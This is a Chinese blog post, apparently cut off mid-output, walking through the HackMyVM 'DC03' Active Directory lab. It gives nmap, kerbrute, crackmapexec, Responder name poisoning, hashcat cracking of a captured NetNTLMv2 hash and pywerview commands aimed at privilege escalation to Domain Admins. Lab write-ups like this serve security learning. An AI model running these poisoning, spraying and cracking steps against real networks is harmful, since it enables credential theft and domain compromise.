<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录生活和学习的点滴" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/logo.png" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="./_next/static/css/c5de5e759cf783b9.css" as="style"/><base href="/"/><link rel="stylesheet" href="./_next/static/css/c5de5e759cf783b9.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="./_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="./_next/static/chunks/webpack-502a0195d0ce5784.js" defer=""></script><script src="./_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="./_next/static/chunks/main-5e3ff9355442ff8e.js" defer=""></script><script src="./_next/static/chunks/pages/_app-14467d077592c8ff.js" defer=""></script><script src="./_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="./_next/static/chunks/pages/posts/%5Bid%5D-e880f70bf6d2a078.js" defer=""></script><script src="./_next/static/leuPzpaT1GtuszjEU9qvn/_buildManifest.js" defer=""></script><script src="./_next/static/leuPzpaT1GtuszjEU9qvn/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-[MesloLGL] font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 font-[MesloLGL] grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMDC03","contentHtml":"\u003ch1\u003eDC03.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=DC03\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=DC03\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eSomething realistic i think. U tell me.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e扫描，\u003ccode\u003e126\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sP 192.168.56.0/24    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:51 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00044s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00026s latency).\nMAC Address: 08:00:27:C9:BF:B4 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SOUPEDECODE.LOCAL (192.168.56.126)\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 28.00 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.126            \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:52 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SOUPEDECODE.LOCAL (192.168.56.126)\nHost is up (0.00099s latency).\nNot shown: 65518 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\nMAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sT -A -T4 -O -p 445,389 192.168.56.126\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:53 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SOUPEDECODE.LOCAL (192.168.56.126)\nHost is up (0.00084s latency).\n\nPORT    STATE SERVICE       VERSION\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n445/tcp open  microsoft-ds?\nMAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 1 hop\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-02-15T21:53:39\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: \u0026#x3C;unknown\u003e, NetBIOS MAC: 08:00:27:21:0c:da (Oracle VirtualBox virtual NIC)\n|_clock-skew: 14h59m58s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.84 ms SOUPEDECODE.LOCAL (192.168.56.126)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 51.08 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没有\u003ccode\u003ehttp\u003c/code\u003e服务，得到域名添加到\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003ch2\u003eSMB - 1\u003c/h2\u003e\n\u003cp\u003e先看\u003ccode\u003eSMB\u003c/code\u003e是否可以使用匿名帐户登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  smbclient -L 192.168.56.126 -U soupedecode.local/anonymous\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [SOUPEDECODE.LOCAL\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域用户枚举 （兔子洞）\u003c/h2\u003e\n\u003cp\u003e没有什么信息，进行域用户枚举，使用\u003ccode\u003ekerbrute\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  ./kerbrute_linux_amd64 userenum --dc 192.168.56.126 -d SOUPEDECODE.LOCAL ~/Desktop/Dict/SecLists-2024.3/Usernames/xato-net-10-million-usernames.txt          \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,\u0026#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev () - 02/15/25 - Ronnie Flathers @ropnop\n\n2025/02/15 02:56:18 \u003e  Using KDC(s):\n2025/02/15 02:56:18 \u003e   192.168.56.126:88\n\n2025/02/15 02:56:18 \u003e  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL\n2025/02/15 02:56:18 \u003e  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL\n2025/02/15 02:56:18 \u003e  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL\n2025/02/15 02:56:20 \u003e  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL\n2025/02/15 02:56:21 \u003e  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL\n2025/02/15 02:58:52 \u003e  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL\n2025/02/15 03:04:20 \u003e  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL\n2025/02/15 03:09:29 \u003e  [+] VALID USERNAME:       kleo2@SOUPEDECODE.LOCAL\n2025/02/15 03:15:20 \u003e  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将用户名保存到\u003ccode\u003euser.txt\u003c/code\u003e，使用\u003ccode\u003ecrackmapexec\u003c/code\u003e 找是否存在弱密码用户，没有存在\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/DC03  crackmapexec smb 192.168.56.126 -u user.txt -p user.txt --continue-on-success --no-bruteforce\nSMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)\nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\charlie:charlie STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\Charlie:Charlie STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\administrator:administrator STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\Administrator:Administrator STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\CHARLIE:CHARLIE STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\wreed11:wreed11 STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\printserver:printserver STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\kleo2:kleo2 STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\dc01:dc01 STATUS_LOGON_FAILURE \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eResponder\u003c/h2\u003e\n\u003cp\u003e再\u003ccode\u003eKali\u003c/code\u003e上抓包，看见存在靶机在发送\u003ccode\u003eMDNS\u003c/code\u003e请求\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e192.168.56.126\u003c/code\u003e 正在发送 \u003ccode\u003emDNS\u003c/code\u003e 查询，例如 \u003ccode\u003eA FileServer.local\u003c/code\u003e，这表明该设备正在尝试解析 \u003ccode\u003e.local\u003c/code\u003e 域名\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDC03/image103.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eResponder\u003c/code\u003e来毒害 \u003ccode\u003eresponder -I eth1 -wd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e root@kali  ~/Desktop/test/DC03  responder -I eth1 -wd                                   \n                                         __                                                     \n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                        \n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                        \n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                          \n                   |__|                         \n                                                                                                                                                                                                           NBT-NS, LLMNR \u0026#x26; MDNS Responder 3.1.5.0                                                                                                                                                                                                                                                                                                                                                 To support this project:                                                                                                                                                                      \n  Github -\u003e https://github.com/sponsors/lgandx  \n  Paypal  -\u003e https://paypal.me/PythonResponder\n  ....\n  [+] Listening \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e events...                                                                                                                                                                     \n                                                                                                                                                                                                \n[*] [NBT-NS] Poisoned answer sent to 192.168.56.126 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FILESERVER (service: File Server)                                                                                                  \n[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer                                                                                                                         \n[*] [MDNS] Poisoned answer sent to 192.168.56.126  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer.\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e                                                                                                                    \n[*] [MDNS] Poisoned answer sent to fe80::dd4d:c480:d553:6413 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer.\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e          \n[*] [LLMNR]  Poisoned answer sent to fe80::dd4d:c480:d553:6413 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer              \n[*] [MDNS] Poisoned answer sent to 192.168.56.126  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer.\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e                    \n[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer                         \n[*] [MDNS] Poisoned answer sent to fe80::dd4d:c480:d553:6413 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer.\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e          \n[*] [LLMNR]  Poisoned answer sent to fe80::dd4d:c480:d553:6413 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e name FileServer              \n[SMB] NTLMv2-SSP Client   : fe80::dd4d:c480:d553:6413                                           \n[SMB] NTLMv2-SSP Username : soupedecode\\xkate578\n[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:ca95e6d0aa430c62:8B512E10179B3FB25A14B93A6C9F59B5:010100000000000080BE8C195A7FDB0165AF79A641F2CB28000000000200080033004D0037004F0001001E00570049004E002D00540050005200330059004200440054004A004E00460004003400570049004E002D00540050005200330059004200440054004A004E0046002E0033004D0037004F002E004C004F00430041004C000300140033004D0037004F002E004C004F00430041004C000500140033004D0037004F002E004C004F00430041004C000700080080BE8C195A7FDB0106000400020000000800300030000000000000000000000000400000EAC8058D7BFBA6470EC09C40DAB5EACCEBBCB9535C70E24094CF6AC5AD46C97D0A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到靶机一直在请求\u003ccode\u003eFileServer\u003c/code\u003e 的域名，\u003ccode\u003eResponder\u003c/code\u003e响应了靶机的请求，使其将 \u003ccode\u003eFILESERVER\u003c/code\u003e 名称解析到攻击者的 \u003ccode\u003eIP\u003c/code\u003e 地址，并且抓到呢\u003ccode\u003exkate578\u003c/code\u003e用户的\u003ccode\u003enet NTLM hash\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003ehashcat\u003c/code\u003e来爆破捕获到的\u003ccode\u003eNTLMv2-SSP Hash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/DC03  hashcat -h | grep NTLM            \n   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol         \n  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol         \n   5600 | NetNTLMv2                                                  | Network Protocol         \n  27100 | NetNTLMv2 (NT)                                             | Network Protocol\n   1000 | NTLM                                                       | Operating System         \n ⚡ root@kali  ~/Desktop/test/DC03  hashcat -m 5600 \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C; NTLMv2-SSP Hash \u003e'\u003c/span\u003e /usr/share/wordlists/rockyou.txt                    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDC03/image104.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到一对账号\u003ccode\u003exkate578:jesuschrist\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003eSMB - 2\u003c/h2\u003e\n\u003cp\u003e获得账号密码后再去\u003ccode\u003eSMB\u003c/code\u003e 服务获取信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/DC03  smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/xkate578%jesuschrist    \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        share           Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e workgroup listing.\ndo_connect: Connection to 192.168.56.126 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003eshare\u003c/code\u003e文件夹下发现\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/DC03  smbclient //192.168.56.126/share -U SOUPEDECODE.LOCAL/xkate578%jesuschrist\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a list of possible commands.\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n  .                                  DR        0  Thu Aug  1 02:06:14 2024\n  ..                                  D        0  Thu Aug  1 01:38:08 2024\n  desktop.ini                       AHS      282  Thu Aug  1 01:38:08 2024\n  user.txt                            A       70  Thu Aug  1 01:39:25 2024\n\n                12942591 blocks of size 4096. 10929469 blocks available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/DC03  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt                                                                                 \n12f54a96f64443246930da001cafda8b\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后经过一系列的尝试，比如\u003ccode\u003eKerberoasting\u003c/code\u003e和\u003ccode\u003eASP_REQ Roasting\u003c/code\u003e ,还有\u003ccode\u003eevil-winrm\u003c/code\u003e 都已失败告终\u003c/p\u003e\n\u003ch2\u003e查看用户信息\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e工具 ： \u003ca href=\"https://github.com/the-useless-one/pywerview\"\u003ehttps://github.com/the-useless-one/pywerview\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e查看用户信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netuser -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --username xkate578\nobjectclass:           top, person, organizationalPerson, user\ncn:                    Xenia Kate                                                               \nsn:                    Kate                                                                     \nl:                     Springfield                                                              \nst:                    NY                                                                       \ntitle:                 Analyst                                                                  \ndescription:           Adventure seeker and extreme sports fan\npostalcode:            81335                \ntelephonenumber:       719-5053                                                                 \ngivenname:             Xenia \ninitials:              XK            \ndistinguishedname:     CN=Xenia Kate,CN=Users,DC=SOUPEDECODE,DC=LOCAL\ninstancetype:          4                                                                        \nwhencreated:           2024-06-15 20:04:39+00:00                                                \nwhenchanged:           2025-02-16 00:32:01+00:00                                                \ndisplayname:           Xenia Kate\nusncreated:            16902                                                                    \nmemberof:              CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL\nusnchanged:            45086                                                                    \ndepartment:            Sales                                                                    \ncompany:               CompanyC                                                                 \nstreetaddress:         123 Elm St\nname:                  Xenia Kate                                                               \nobjectguid:            {f5dee86d-8f4e-4591-8446-0250d6e4bf92}                                   \nuseraccountcontrol:    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nbadpwdcount:           0  \ncodepage:              0             \ncountrycode:           0         \nbadpasswordtime:       1601-01-01 00:00:00+00:00                                    \nlastlogoff:            1601-01-01 00:00:00+00:00                                                \nlastlogon:             2025-02-16 00:32:01.361403+00:00                                                                                                                                         \nlogonhours:            ffffffffffffffffffffffffffffffffffffffffff...\npwdlastset:            2024-08-01 05:37:18.874022+00:00  \nprimarygroupid:        513                      \nobjectsid:             S-1-5-21-2986980474-46765180-2505414164-1182                                                                                                                             \nadmincount:            1       \naccountexpires:        1601-01-01 00:00:00+00:00 \nlogoncount:            6                                                                        \nsamaccountname:        xkate578                                                                                                                                                                 \nsamaccounttype:        805306368                                                                \nuserprincipalname:     xkate578@soupedecode.local                                               \nobjectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL             \ndscorepropagationdata: 2024-08-01 05:47:50+00:00, 1601-01-01 00:00:00+00:00                     \nlastlogontimestamp:    2025-02-16 00:32:01.361403+00:00                                         \nmail:                  xkate578@soupedecode.local                               \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e从\u003ccode\u003ememberof: CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL\u003c/code\u003e 中可以看到用户属于\u003ccode\u003eAccount Operators\u003c/code\u003e 组\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e我们是\u003ccode\u003eAccount Operators\u003c/code\u003e 组的成员，拥有\u003cstrong\u003e向用户授予有限的帐户创建权限\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e可以修改大多数类型的账户，可以管理本地用户和组，但不具备修改管理员组或全局组成员身份的权限\u003c/p\u003e\n\u003cp\u003e现在是要寻找\u003c/p\u003e\n\u003cp\u003e列出管理组的成员，可以看到成员包括一个组\u003ccode\u003eOperators\u003c/code\u003e 和\u003ccode\u003eadministrator\u003c/code\u003e 用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netgroupmember -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --group \u003cspan class=\"hljs-string\"\u003e\"Domain Admins\"\u003c/span\u003e\ngroupdomain:  SOUPEDECODE.LOCAL\ngroupname:    Domain Admins\nmembername:   Operators\nmemberdomain: SOUPEDECODE.LOCAL\nisgroup:      True\nmemberdn:     CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL\nobjectsid:    S-1-5-21-2986980474-46765180-2505414164-2165 \n\ngroupdomain:  SOUPEDECODE.LOCAL\ngroupname:    Domain Admins\nmembername:   Administrator\nmemberdomain: SOUPEDECODE.LOCAL\nisgroup:      False\nmemberdn:     CN=Administrator,CN=Users,DC=SOUPEDECODE,DC=LOCAL\nobjectsid:    S-1-5-21-2986980474-46765180-2505414164-500 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e跟进\u003ccode\u003eOperators\u003c/code\u003e ，能发现存在 \u003ccode\u003efbeth103\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e然后\u003ccode\u003efbeth103\u003c/code\u003e 属于\u003ccode\u003eOperators\u003c/code\u003e 组，而\u003ccode\u003eOperators\u003c/code\u003e 又属于\u003ccode\u003eDomain Admins\u003c/code\u003e组，那么\u003ccode\u003efbeth103\u003c/code\u003e 就拥有\u003ccode\u003eDomain Admins\u003c/code\u003e组的权限。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAccount Operators\u003c/code\u003e 组能够修改 \u003ccode\u003efbeth103\u003c/code\u003e 用户的账户信息，即使 \u003ccode\u003efbeth103\u003c/code\u003e 属于 \u003ccode\u003eOperators\u003c/code\u003e 组，而 \u003ccode\u003eOperators\u003c/code\u003e 组又是 \u003ccode\u003eDomain Admins\u003c/code\u003e 组的成员\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netgroupmember -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --group \u003cspan class=\"hljs-string\"\u003e\"Operators\"\u003c/span\u003e    \ngroupdomain:  